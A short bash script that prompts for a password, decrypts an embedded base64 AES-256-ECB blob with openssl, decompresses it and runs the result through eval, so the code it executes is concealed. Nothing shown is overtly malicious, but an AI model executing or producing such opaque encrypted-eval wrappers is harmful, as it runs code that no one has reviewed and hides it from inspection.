#!/bin/bash
read -p "Please provide a password: " PASSWORD
eval "$(echo "U2FsdGVkX1+BFnhmGJcNuVA3vxRowta2Uo7yJAgLvK77sFuTp5Fp45nfVfYbw7Dq" | base64 -d | openssl enc -d -AES-256-ECB -in /dev/stdin -out /dev/stdout -k "$PASSWORD" | gunzip)"
